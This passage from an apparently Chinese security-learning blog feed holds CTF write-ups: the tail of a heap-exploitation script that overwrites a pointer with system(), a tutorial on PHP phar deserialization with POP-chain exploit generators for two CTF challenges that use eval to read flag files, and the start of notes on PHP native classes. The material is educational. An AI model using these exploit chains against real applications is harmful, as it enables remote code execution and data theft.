class="string">&quot;free_addr&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = free_addr-libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到_flag_</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407102221509.png" alt="image-20240710222113464"></p>
]]></content>
      <categories>
        <category>pwn学习总结</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>堆</tag>
      </tags>
  </entry>
  <entry>
    <title>phar反序列化学习总结</title>
    <url>/2024/12/10/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>Phar反序列化漏洞是PHP中的一种安全漏洞，与PHP的Phar扩展和对象反序列化机制有关。Phar扩展允许将多个文件打包成一个单一的Phar归档文件，类似于ZIP或TAR。当Phar归档文件被加载时，PHP会自动反序列化其中的元数据。如果攻击者能够控制Phar归档文件的内容，他们可以构造恶意的元数据，使其在反序列化时触发任意代码执行。这种漏洞通常发生在应用程序对用户上传的文件处理不当，允许攻击者上传并加载恶意的Phar文件时。</p>
<span id="more"></span>

<h2 id="前提知识"><a href="#前提知识" class="headerlink" title="前提知识"></a>前提知识</h2><p>怎么构造<code>pop</code>链：</p>
<p>​	序列化后，类便会被重构，我们可以通过，<strong>覆盖类中的属性变量，来触发魔术方法</strong>，进而执行危险方法或函数。</p>
<h3 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a><code>phar</code>文件结构</h3><p><code>phar</code>文件主要由四部分组成</p>
<ul>
<li><strong>a stub</strong></li>
</ul>
<p>格式为：<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>。要求是必须以**<code>__HALT_COMPILER();?&gt;</code>**结尾，否则<code>phar</code>拓展将无法识别这个文件为<code>phar</code>文件。</p>
<ul>
<li><strong>a manifest describing the contents</strong></li>
</ul>
<p><code>phar</code>文件中被压缩的文件的一些信息，其中<code>Meta-data</code>部分的信息会以序列化的形式储存，这里是漏洞利用的关键点。</p>
<ul>
<li><strong>the file contents</strong></li>
</ul>
<p>被压缩的文件的内容。</p>
<ul>
<li><strong>a signature for verifying Phar integrity</strong></li>
</ul>
<p>签名，放在文件末尾，格式如下：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102039889.png" alt="image-20250112164001940" style="zoom: 50%;" />

<p>​	<strong>注意：需要修改<code>php.ini</code>文件中的<code>phar.readonly = On</code>为<code>phar.readonly = Off</code>，才能成功生成<code>.phar</code>文件。</strong></p>
<p>一个简单的例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);   <span class="comment">//后缀名必须是phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);   <span class="comment">//设置stub</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line"><span class="variable">$t</span>-&gt;data = <span class="string">&quot;meta_data&quot;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$t</span>);   <span class="comment">//将自定义的meta-data($t) 存入manifest</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;xxx&quot;</span>);   <span class="comment">//添加要压缩的文件，随便写</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();   <span class="comment">//签名自动计算</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​	运行代码，会在同目录下生成一个<code>phar.phar</code>文件，其内容如下，可以看到<code>meta-data</code>是以序列化的形式存储的。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102040034.png" alt="image-20250112180250240" style="zoom:67%;" />

<p>​	<code>php</code>大部分的文件系统函数，在参数可控的情况下，通过<code>phar://</code>伪协议解析<code>phar</code>文件时，都会将<code>meta-data</code>进行反序列化。如下：</p>
<p>进行反序列化操作</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;phar://phar.phar&#x27;</span>);</span><br><span class="line"><span class="comment">// echo file_get_contents(&quot;phar.phar&quot;);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="利用前提条件"><a href="#利用前提条件" class="headerlink" title="利用前提条件"></a>利用前提条件</h3><p>先简单说一下<code>phar</code>反序列化漏洞能够利用的基本前提：</p>
<ul>
<li><code>phar</code>文件能够上传到服务器</li>
<li>要有可利用的魔术方法，来触发反序列化</li>
<li>文件操作函数的参数可控，且：<code>/</code>、<code>phar</code>字符没有被过滤</li>
</ul>
<h2 id="ctf实战练习"><a href="#ctf实战练习" class="headerlink" title="ctf实战练习"></a><code>ctf</code>实战练习</h2><h3 id="1-CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#1-CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="1.[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a><code>1.[CISCN2019 华北赛区 Day1 Web1]Dropbox</code></h3><h3 id="2-SWPUCTF-2018-SimplePHP"><a href="#2-SWPUCTF-2018-SimplePHP" class="headerlink" title="2.[SWPUCTF 2018]SimplePHP"></a><code>2.[SWPUCTF 2018]SimplePHP</code></h3><p>怎么构造<code>pop</code>链：</p>
<p>​	序列化后，类便会被重构，我们可以通过，<strong>覆盖类中的属性变量，来触发魔术方法</strong>，进而执行危险方法或函数。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">C1e4r</span>();</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$p</span>-&gt;str = <span class="variable">$s</span>;</span><br><span class="line"><span class="variable">$s</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>] = <span class="variable">$t</span>;</span><br><span class="line"><span class="variable">$t</span>-&gt;params[<span class="string">&#x27;source&#x27;</span>] = <span class="string">&quot;/var/www/html/f1ag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;s.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$p</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;aaaaa&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="3-GXYCTF2019-BabysqliV3-0"><a href="#3-GXYCTF2019-BabysqliV3-0" class="headerlink" title="3.[GXYCTF2019]BabysqliV3.0"></a><code>3.[GXYCTF2019]BabysqliV3.0</code></h3><h4 id="分析upload-php源码"><a href="#分析upload-php源码" class="headerlink" title="分析upload.php源码"></a>分析<code>upload.php</code>源码</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$Filename</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># function __construct();</span></span><br><span class="line"><span class="comment"># function __toString();</span></span><br><span class="line"><span class="comment"># function __destruct();</span></span><br><span class="line"><span class="comment"># function upload($file);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$uploader</span> = <span class="keyword">new</span> <span class="title class_">Uploader</span>();   <span class="comment">#接着调用__construct函数</span></span><br><span class="line">	<span class="variable">$uploader</span>-&gt;<span class="title function_ invoke__">upload</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]);   <span class="comment">#会调用upload方法,$file=$_FILES[&quot;file&quot;]</span></span><br><span class="line">	<span class="keyword">if</span>(@<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploader</span>))   <span class="comment">#执行这一步前，会自行调用__destruct函数</span></span><br><span class="line">	&#123;   <span class="comment">#接着这里会触发__toString()函数</span></span><br><span class="line">	    <span class="keyword">echo</span> <span class="string">&quot;下面是你上传的文件：&lt;br&gt;&quot;</span>.<span class="variable">$uploader</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploader</span>);   </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>实例化一个类的对象后，会自发调用<code>__construct()</code>构造函数。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)   #构造函数。它在创建类的新对象时自动调用</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="title function_ invoke__">getcwd</span>().<span class="string">&quot;/uploads/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;/&quot;</span>;</span><br><span class="line">	<span class="variable">$ext</span> = <span class="string">&quot;.txt&quot;</span>;</span><br><span class="line">	@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">	&#123;</span><br><span class="line">	    <span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];   <span class="comment">#需要执行这一步</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	    <span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$sandbox</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>].<span class="variable">$ext</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;</span>;</span><br><span class="line">	<span class="variable language_">$this</span>-&gt;token = <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后会调用<code>upload($file)</code>方法，下面的<code>[^a-z0-9]</code>表示，匹配任何非小写字母或非数字的符号。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$file</span></span>)   #<span class="title">file</span> = $<span class="title">_FILES</span>[&quot;<span class="title">file</span>&quot;]</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$sandbox</span>;   <span class="comment">#当前目录/uploads/md5($_SESSION[&#x27;user&#x27;])/</span></span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$ext</span>;   <span class="comment">#.txt</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;[^a-z0-9]&quot;</span>, <span class="variable">$this</span>-&gt;Filename))</span><br><span class="line">	&#123;</span><br><span class="line">	    <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>   <span class="comment">#需要进入else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>)</span><br><span class="line">		    <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;you are too big (′▽`〃)&#x27;);&quot;</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		    <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;move_uploaded_file(&#x27;&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span> . <span class="variable language_">$this</span>-&gt;Filename . <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;   <span class="comment">#设置了this-&gt;cmd = move_uploaded_file(&#x27;xx&#x27;, &#x27;xxx&#x27;);</span></span><br></pre></td></tr></table></figure>

<p>上面最后一行代码看起来比较乱，其实就是利用<code>.</code>连接了五个部分，下面我框出了要连接的内容。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102040050.png" alt="QQ_1727423925626"></p>
<p>如果其中，<code>$file[&#39;tmp_name&#39;]=tmp_name</code>、<code>$this-&gt;Filename=filename</code>，那么连接起来就是这样的：<code>move_uploaded_file(&#39;tmp_name&#39;, &#39;filename&#39;);</code>。</p>
<p>而<code>move_uploaded_file()</code>是一个用于将上传的文件，<strong>从临时目录移动到新的路径下</strong>的函数，如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="string">&#x27;临时文件路径&#x27;</span>, <span class="string">&#x27;目标文件路径&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>接下来将随着类的销毁，会自发调用<code>__destruct</code>析构函数。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;token != <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);   <span class="comment">#要绕过if，执行eval()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功绕过<code>if</code>后，便能执行<code>move_uploaded_file($file[&#39;tmp_name&#39;], $this-&gt;Filename);</code>。然后回到主程序流中，即将进行<code>if</code>语句的判断，但此时也触发了<code>__toString()</code>函数。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$sandbox</span>;   </span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$ext</span>;  </span><br><span class="line">	<span class="comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="line">	<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;Filename;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>__toString()</code>执行完后，程序会接着执行<code>echo file_get_contents($this-&gt;Filename);</code>。</p>
<h4 id="phar反序列化利用思路"><a href="#phar反序列化利用思路" class="headerlink" title="phar反序列化利用思路"></a><code>phar</code>反序列化利用思路</h4><p>​	<code>Uploader</code>类中有一个魔术方法<code>__destruct()</code>，其中我们可以利用<code>eval($this-&gt;cmd)</code>，但是要绕过<code>if</code>语句，否则，<code>$this-&gt;cmd</code>会被重新赋值，那么<code>exp.phar</code>中的对<code>$this-&gt;cmd</code>值便无效了。</p>
<p>​	而绕过<code>if</code>需要使<code>token</code>等于<code>$_SESSION[&#39;user&#39;]</code>，通过前面对源码的分析及上传文件后的回显可知，<code>$_SESSION[&#39;user&#39;]</code>其实就是回显里的<code>.txt</code>前面的一串字符。</p>
<p><code>exp.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HaHa</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;highlight_file(&#x27;/var/www/html/flag.php&#x27;);&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Filename = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token = <span class="string">&quot;GXY897d924ee25aa61d0373a64ee3e56354&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">HaHa</span>();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;exp.phar&quot;</span>);   <span class="comment">#生成的.phar文件名称</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);   <span class="comment">#固定格式</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$p</span>);   <span class="comment">#传入触发对象</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;phar.txt&quot;</span>,<span class="string">&quot;phar&quot;</span>);   <span class="comment">#随便写点，生成签名</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4><p>随便上传一个文件，点击两次’上传’，得到<code>token</code>。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102040522.png" alt="image-20240927195911158"></p>
<p>然后运行<code>exp.php</code>，生成<code>exp.phar</code>文件，上传<code>exp.phar</code>，这里只点击一次’上传’即可。</p>
<p>再随便上传一个文件，<code>Burp</code>抓包，添加参数<code>name=/var/www/html/flag.php</code>后，发送即可获得<code>flag</code>。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202505102040120.png" alt="image-20240927200749703"></p>
<p>唉，这道题写一天了，也没真正搞清楚，只能先放这儿了。</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>php原生类的利用</title>
    <url>/2025/02/18/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<p>这一篇的主要内容是php中的一些原生类的原理及其利用，目前只记录了Error(Exception类与其大致相同只是php版本不同)和SoapClient这两个原生类。</p>
<span id="more"></span>

<h1 id="php中的内置类"><a href="#php中的内置类" class="headerlink" title="php中的内置类"></a>php中的内置类</h1><h2 id="Error类"><a href="#Error类" class="headerlink" title="Error类"></a>Error类</h2><p><strong>Error</strong> 是所有PHP内部错误类的基类，该类是在PHP 7.0.0 中开始引入的。</p>
<p><strong>类摘要：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Error</span> <span class="keyword">implements</span> <span class="built_in">Throwable</span> &#123;</span><br><span class="line">    <span class="comment">/* 属性 */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$message</span> ;   <span class="comment">#错误消息内容</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$code</span> ;   <span class="comment">#错误代码</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$file</span> ;   <span class="comment">#抛出错误的文件名</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$line</span> ;   <span class="comment">#抛出错误在该文件中的行数</span></span><br><span class="line">    <span class="comment">/* 方法 */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span> <span class="variable">$message</span> = <span class="string">&quot;&quot;</span> , <span class="keyword">int</span> <span class="variable">$code</span> = <span class="number">0</span> , <span class="built_in">Throwable</span> <span class="variable">$previous</span> = <span class="literal">null</span> )</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getMessage</span> ( ) : <span class="keyword">string</span>     <span class="comment">#获取错误信息</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getPrevious</span> ( ) : <span class="built_in">Throwable</span>     <span class="comment">#返回先前的 Throwable</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getCode</span> ( ) : <span class="keyword">mixed</span>     <span class="comment">#获取错误代码</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getFile</span> ( ) : <span class="keyword">string</span>     <span class="comment">#获取错误发生时的文件</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getLine</span> ( ) : <span class="keyword">int</span>     <span class="comment">#获取错误发生时的行号</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTrace</span> ( ) : <span class="keyword">array</span>     <span class="comment">#获取调用栈（stack trace）</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTraceAsString</span> ( ) : <span class="keyword">string</span>     <span class="comment">#获取字符串形式的调用栈（stack trace）</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__toString</span> ( ) : <span class="keyword">string</span>     <span class="comment">#error 的字符串表达</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">private</span> <span class="title function_ invoke__">__clone</span> ( ) : <span class="keyword">void</span>     <span class="comment">#克隆 error</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="toString方法"><a href="#toString方法" class="headerlink" title="__toString方法"></a><span style="color: orange;">__toString方法</span></h3><p><strong><code>__toString</code>方法用于当一个类被当作字符串时该怎样回应。例如当echo一个类时，便出现了错误，但该怎样去处理这个问题呢？该方法会将错误或异常对象转换为字符串。</strong></p>
<h2 id="SoapClient类"><a href="#SoapClient类" class="headerlink" title="SoapClient类"></a>SoapClient类</h2><p>PHP的内置类SoapClient是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的PHP客户端。</p>
<p>类摘要：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">SoapClient &#123;</span><br><span class="line">    <span class="comment">/* 方法 */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span>|<span class="literal">null</span> <span class="variable">$wsdl</span> , <span class="keyword">array</span> <span class="variable">$options</span> = [] )</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__call</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">array</span> <span class="variable">$args</span> ) : <span class="keyword">mixed</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__doRequest</span> ( <span class="keyword">string</span> <span class="variable">$request</span> , <span class="keyword">string</span> <span class="variable">$location</span> , <span class="keyword">string</span> <span class="variable">$action</span> , <span class="keyword">int</span> <span class="variable">$version</span> , <span class="keyword">bool</span> <span class="variable">$oneWay</span> = <span class="literal">false</span> ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getCookies</span> ( ) : <span class="keyword">array</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getFunctions</span> ( ) : <span class="keyword">array</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getLastRequest</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getLastRequestHeaders</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getLastResponse</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getLastResponseHeaders</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__getTypes</span> ( ) : <span class="keyword">array</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__setCookie</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">string</span>|<span class="literal">null</span> <span class="variable">$value</span> = <span class="literal">null</span> ) : <span class="keyword">void</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__setLocation</span> ( <span class="keyword">string</span> <span class="variable">$location</span> = <span class="string">&quot;&quot;</span> ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__setSoapHeaders</span> ( SoapHeader|<span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$headers</span> = <span class="literal">null</span> ) : <span class="keyword">bool</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__soapCall</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">array</span> <span class="variable">$args</span> , <span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$options</span> = <span class="literal">null</span> , 